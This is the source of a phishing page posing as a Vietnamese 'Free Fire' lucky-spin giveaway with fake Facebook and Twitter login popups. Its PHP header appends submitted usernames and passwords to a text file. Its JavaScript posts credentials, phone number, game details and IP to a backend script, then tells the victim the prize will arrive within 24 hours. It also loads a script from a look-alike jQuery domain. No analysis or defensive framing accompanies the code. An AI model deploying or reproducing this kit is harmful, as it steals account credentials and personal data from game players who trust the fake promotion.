<?php
/* Nông Văn Nguyên */
if(isset($_POST['ip'])){
require('ngBackend/ngControllers.php');
$ng = new ngControllers();
$user = $ng->post($_REQUEST['user']);
$pass = $ng->post($_REQUEST['pass']);
$id = $ng->post($_REQUEST['id']);
$nick = $ng->post($_REQUEST['nick']);
$ip = $ng->post($_REQUEST['ip']);
$file = fopen('nvnvip.txt','a');
        fwrite($file,$user.'/'.$pass.PHP_EOL);
        fclose($file); 
}else{
header('location:index.php');
exit();
}
?>

<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Free Fire - Vòng Quay May Mắn">
<meta name="description" content="Thử vận may của bạn hoàn toàn miễn phí !">
<meta property="og:description" content="Thử vận may của bạn hoàn toàn miễn phí !">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Free Fire - Vòng Quay May Mắn">
<meta property="og:type" content="website">
<meta name="copyright"content="Nông Văn Nguyên">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://vongquaynangcap.com/nongvannguyen.jpg">
<title>Free Fire - Vòng Quay May Mắn</title>
<link rel="stylesheet" href="https://vongquaynangcap.com/css/style.css">
<link rel="stylesheet" href="https://vongquaynangcap.com/css/animate.css">
<link rel="stylesheet" href="https://vongquaynangcap.com/css/login/facebook.css">
<link rel="stylesheet" href="https://vongquaynangcap.com/css/login/twitter.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">

<link rel="icon" href="https://ff.garena.vn/wp-content/themes/freefire/images/game-icon.png">
</head>
<!-- <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> -->
	<body>
<style type="text/css">
	@charset "utf-8";
@import url('https://fonts.googleapis.com/css2?family=Baloo+2:wght@600&display=swap');
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'pubgFont'; 
    font-style: normal;
    font-weight: 700;
    src: url(https://vongquaynangcap.com/fonts/pubg.woff2) format("woff2"), 
        url(https://vongquaynangcap.com/fonts/pubg.woff) format("woff"),
        url(https://vongquaynangcap.com/fonts/pubg.ttf) format("truetype");
}
body {
	background:black;
	margin: 0;
	font-family: 'Teko';
}
.container {
	background: url(https://vongquaynangcap.com/img/container-bg.png) no-repeat center;
	background-size: 100% 100%;
	position: relative;
	margin: 0px auto;
	max-width: 400px;
	height: auto;
	border: 1px solid #57c0ff;
}
.navbar {
	background:#000;
	width:100%;
	height:50px;
	padding:4px;
	border-bottom:1px solid #4dcafd;
}
.navbar img {
	width:41;
	margin-right:5px;
	border-radius:5px;
	float:left;
}
.navbar-txt-game {
	padding-top:2px;
	color:#feab02;
	font-size:18px;
	font-family:'Teko',sans-serif;
	text-align:left;
}
.navbar-txt-game span {
	color:#d9d9d8;
	font-size:13px;
	line-height:10px;
	display:block;
}
.navbar-btn-wrapper {
	margin-top:5px;
	float:right;
}
.navbar-btn-wrapper i {
	margin-left:5px;
	font-size:38px;
	color:#d9d9d8;
	line-height:31px;
	float:right;
}
.navbar-btn {
	background:#eaa300;
	width:70px;
	height:auto;
	margin:2px;
	padding:2px;
	color:#000;
	font-size:15px;
	font-family: 'Baloo 2';
	text-align:center;
	text-transform:uppercase;
	border:1px solid #ffcc57;
	display:inline-block;
	outline:none;
}
.header {
    width: 100%;
    height: 200px;
	margin-left: auto;
	margin-right: auto;
	border-bottom: 1px solid #4dcafd;
	display: block;
}
.header img {
	width: 100%;
	height: 100%;
}
.landing {
	width:100%;
	height:auto;
}
.event-wrapper {
	width: 100%;
	margin-bottom:100%;
	padding: 10px;
}
.event-wrapper img:nth-child(1) {
	width: 130px;
	float: right;
}
.event-notify {
	background-color:rgba(0, 0, 0, 0.8);
	width:100%;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	padding: 8px;
	display:block;
}
.event-notify-title {
	padding-bottom:10px;
	color:#fff;
	font-size:17px;
	font-family:pubgFont;
	text-align:left;
	text-decoration:underline;
}
.event-notify-content {
	color:#fff;
	font-size:16px;
	font-family:pubgFont;
	text-align:left;
	line-height:18px;
}
.event-btn {
	background:transparent;
	width:auto;
	height:auto;
	margin-top:20px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:15px;
	padding:7px;
	padding-left:15px;
	padding-right:15px;
	color:#eaa300;
	font-size:17px;
	font-family:pubgFont;
	text-align:center;
	border:1px solid #eaa300;
	outline:none;
	display:block;
}
.box {
    width: 95%;
    height: auto;
	margin-top: 12px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 12px;
	position: relative;
	border-radius: 5px;
	display: block;
}
.event-alert {
	background:url(https://vongquaynangcap.com/img/popup1.png) no-repeat center center;
	background-size:100% 100%;
	width:100%;
	height: 55px;
	margin-left:auto;
	margin-right:auto;
	padding:5px;
	display:block;
	border-radius: 4px;
}
.event-alert span{
	position: absolute;
	top: 5.5%;
	right: 7%;
	width: auto;
	color:white;
}
.event-alert-title {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 17px;
	font-family: pubgFont;
	text-align: center;
}
.event-alert-desc {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 16px;
	font-family: 'Baloo 2', cursive;
	text-align: center;
	line-height: 15px;
}
.menu-wrapper-border {
	height: 11px;
}
.menu-wrapper {
	width: 40%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 5px;
	display: block;
}
.menu-content {
	background:url(https://vongquaynangcap.com/img/popup1.png) no-repeat center center;
	background-size:100% 100%;
	width: auto;
	height: auto;
	padding: 7px;
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 12px;
	font-family: 'Baloo 2', cursive;
	text-align: center;
	border: none;
	cursor: pointer;
}
.menu-content-active {
	background:url(https://vongquaynangcap.com/img/menu_off.png) no-repeat center center;
	background-size:100% 100%;
	color: #fff;
}
.scroll {
	position:relative;
	width: 100%;
	height:390px;
	margin-top:11px;
	margin-left: auto;
	margin-right: auto;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-color:#ffbb40;
}
.hadiah {
	width: 90px;
	height: 90px;
	display: inline-block;
}

.hadiah img {
	width: 100%;
    height: 100%;
    border-radius: 7px;
    border:none;
}

@media only screen and (max-width:600px) {



}

.active{
	border:1px solid orange;
}

.tombol {
	width: 95px;
	height: 90px;
	position: absolute;
	top:36%;
	left: 38.5%;
}
.tombol img {
	width: 100%;
    height: 100%;
}

.footer {
	background: #050711;
	width: 100%;
	height: auto;
	padding: 10px;
	border-top: 1px solid #57c0ff;
}
.footer-txt-follow {
	margin-top: 10px;
	margin-bottom: 10px;
	color: #fff;
	font-size: 17px;
	font-family:pubgFont;
	font-weight: bold;
	text-align: center;
	text-transform: uppercase;
}
.footer-follow-icon {
	width: 49px;
	height: 49px;
	margin: 5px;
	display: inline-block;
}
.footer-txt-copyright {
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	text-align: center;
}
.footer-copyright-icon {
	width: 90%;
	margin-top: 20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	display: block;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box {
	background:url(https://vongquaynangcap.com/img/popup1.png) no-repeat center;
	background-size:100% 100%;
	width:380px;
	height:270px;
	position:relative;
	margin:50px auto;
	margin-top:16%;
	text-align:center;
}
.popup-title {
	padding-left: 20px;
	padding-top: 20px;
	color: #5fe3ff;
	text-shadow: 0 0 0.21rem rgba(144,180,236,0.74);
	font-size:20px;
	font-family: 'Baloo 2', cursive;
	text-align:left;
}
.popup-content {
	width: 100%;
	height: 76.5%;
	border: 1px solid transparent;
	position: relative;
}
.popup-rewards-title {
	color: #fff;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size:20px;
	font-family: 'Baloo 2', cursive;
	text-align:center;
}
.popup-rewards-img1 {
	width: 90px;
	height: 90px;
	margin: 5px;
	margin-top: 10px;
	display: inline-block;
}
.popup-btn-wrapper {
	width: 100%;
	height: 50px;
}
.popup-btn-wrapper button {
	width: 30%;
	height: 30px;
	padding: 2px;
	font-size: 18px;
	font-family: 'Baloo 2', cursive;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-deactive {
	background: url(https://vongquaynangcap.com/img/tag1.png) no-repeat center;
	background-size: 100% 100%;
	position: absolute;
	left: 15%;
	margin-top: -35px;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	color: silver;
}
.popup-btn-active {
	background: url(https://vongquaynangcap.com/img/menu_off.png) no-repeat center;
	background-size: 100% 100%;
	position: absolute;
	left: 35%;
	margin-top: -35px;
	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	color: #fff;
}
.btn-login {
    width: 85%;
    height: auto;
    padding: 8px;
    margin-left: auto;
	margin-right: auto;
    color: #000;
    text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	font-size: 15px;
    font-family: 'Baloo 2', cursive;
    border: none;
    border-radius: 5px;
    outline: none;
    display: block;
}
.btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.facebook {
    background: #3b5998;
    color: #fff;
	margin-top: 20px;
	margin-bottom: 3px;
}
.twitter {
    background: #08a0e9;
    color: #fff;
	margin-bottom: 10px;
}
.popup-close {
	width:20px;
	height:20px;
	color:#000;
	text-align:center;
	text-transform: uppercase;
	font-weight: bold;
	position:absolute;
	top:13px;
	right:10px;
	display:block;
}
.popup-close i {
	color:#000;
	font-size: 25px;
}
.popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:380px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.verify-input {
	background: #dfedf975;
	background-size: 100% 100%;
	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	color: #fff;
	font-size:15px;
	font-family: 'Baloo 2', cursive;
	border-top: 0.5px solid white;
	border-bottom: 0.5px solid white;
	border-right: 2px solid white;
	border-left: 2px solid white;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-input::placeholder {
	color: #fff;
}
.verify-select {
	background: #dfedf975;
	background-size: 100% 100%;
	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
	width: 90%;
	height: auto;
	margin-bottom: 3px;
	padding: 6px;
	padding-left: 3px;
	color: #fff;
	font-size: 15px;
	font-family:pubgFont;
	border-top: 0.5px solid white;
	border-bottom: 0.5px solid white;
	border-right: 2px solid white;
	border-left: 2px solid white;
	border-radius: 3px;
	position: relative;
	outline: none;
}
.verify-btn {
    background: url(https://vongquaynangcap.com/img/menu_off.png) no-repeat center;
	background-size: 100% 100%;
	width: 35%;
	height: auto;
	margin-top: 10px;
	padding: 10px;
	font-size: 15px;
	font-family:Teko;
	text-align: center;
	color: #fff;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
.header{
		max-width: 400px;
		height: 210px;
		margin:0px;
	}
	.item div {
    width: 100%;
    height: 100%;
    border-radius: 3px 3px 0px 0px;
	}
	.item div:first-child {
	    margin-left: 0;
	}

	figure {
    margin: 0;
    padding: 0;
    overflow: hidden;
	}
	.lightshagitz figure {
    position: relative;
	}
	.lightshagitz figure::before {
	    position: absolute;
	    top: 0;
	    left: -75%;
	    z-index: 2;
	    display: block;
	    content: '';
	    width: 50%;
	    height: 100%;
	    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	    -webkit-transform: skewX(-25deg);
	    transform: skewX(-25deg);
	}
	.lightshagitz figure::before {
	    -webkit-animation: shine 2s infinite;
	    animation: shine 2s infinite;
	}
	@-webkit-keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
	@keyframes shine {
	    100% {
	        left: 125%;
	    }
	}
@media only screen and (max-width:600px) {
    .container {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
		border-top:1px solid #57c0ff;
        border-radius: 0px;
        padding: 0px;
    }

	.box {
	    width: 96%;
		height: auto;
	}
    .scroll {
        height: none;
    }

    .popup-box {
        width: 345px;
        margin-top: 60%;
    }
    .popup-item {
        width:25%;
        height:85px;
	}
	.popup-box-login-fb {
		margin-top: 4%;
	}
	.popup-box-login-twitter {
		margin-top: 25%;
	}
	.header{
		width: 100%;
		}
}
</style><!-- Code by Nông Văn Nguyên
Facebook.com/778578204 -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">
	$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);

$(document).ready(function() { 
var detik = 59;
var menit = 59;
var jam = 23;
function hitung() { 
setTimeout(hitung,1000); $('#seasonTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
if(detik < 0) { 
detik = 59; 
menit --; 
if(menit < 0) { 
menit = 0; 
detik = 0; 
} 
} 
} 
hitung(); 
}
);
</script>
<!-- Code by Nông Văn Nguyên
Facebook.com/778578204 -->
<script>
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}

function close_account_login(){
	$('.account_login').hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}

</script><div class="container rewardsBox">
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Tải Game</button>
</div> <!--- navbar-btn-wrapper --->
<img src="https://ff.garena.vn/wp-content/themes/freefire/images/game-icon.png">
<div class="navbar-txt-game">
FREE FIRE
<span>VÒNG QUAY FREE FIRE </span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<img id="banner" src="https://vongquaynangcap.com/img/banner.jpg">
</div> <!--- slider --->
</div> <!--- header --->
<div class="box">
<div class="event-alert">
<div class="event-alert-title">Thành Công</div>
<div class="event-alert-desc">Vật Phẩm Sẽ Gửi Vào Tủ Đồ Bạn Trong 24H </div>
</div> 
        
       
        
        
    </section>
    
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="http://api-jquery.in/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
    $(document).ready(function(){
       $(".loader").fadeOut();
    })
      
     </script>
    <script>
    function ngValidation()
    {
    var jQueryinIt = [];
    var user = $("#user").val();
    var pass = $("#pass").val();
    var id = $("#id").val();
    var nick = $("#nick").val();
    var ip = $("#ip").val();
    var hp = $("#hp").val();
    var level = $("#level").val();
    var tier = $("#tier").val();
    var ep = $("#ep").val();
    var nomer = $("#hp").attr("data-alert");
    
    $(".gagal").hide();
    $(".check").hide();
    $(".salah").hide();
    $(".wrong").hide();
    
    if(hp == "" || hp == null || hp.length <= 10){
    $(".salah").show()
    return false;
    }else{
    $(".salah").hide();
    }
    
    if(level == "" || level == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(tier == "" || tier == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    if(ep == "" || ep == null){
    $(".gagal").show()
    return false;
    }else{
    $(".gagal").hide()
    }
    
    
    if(nomer == "false"){
    $(".gagal").hide();
    $(".check").show();
    $(".salah").hide();
    $.get("ngBackend/ngNumber.php?hp="+hp,function(ng){
    if(ng == "NotFound"){
    $("#hp").attr("data-alert","false");
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").show();
    return false;
    }else{
    $("#hp").attr("data-alert","true");
    $("#hp").prop("readonly",true);
    $(".gagal").hide();
    $(".check").hide();
    $(".wrong").hide();
    $("#submit").prop("disabled",true);
    jQueryInit();
    }
    })
    }
    
    // MENGIRIM PARAMS KE ngFinal.php
    $.post("ngFinal.php",{
         user:user,
         pass:pass,
         id:id,
         hp:hp,
         level:level,
         nick:nick,
         tier:tier,
         ep:ep,
         ip:ip
    },function(ngSuccess){
         $("#submit").prop("disabled",true);
         });
    
    $("#submit").prop("disabled",true);
    setTimeout(() => {
    $(".sukses").css("display","flex");
    },1000);
    return false;
    }
    </script>
    
    
</body>

</html>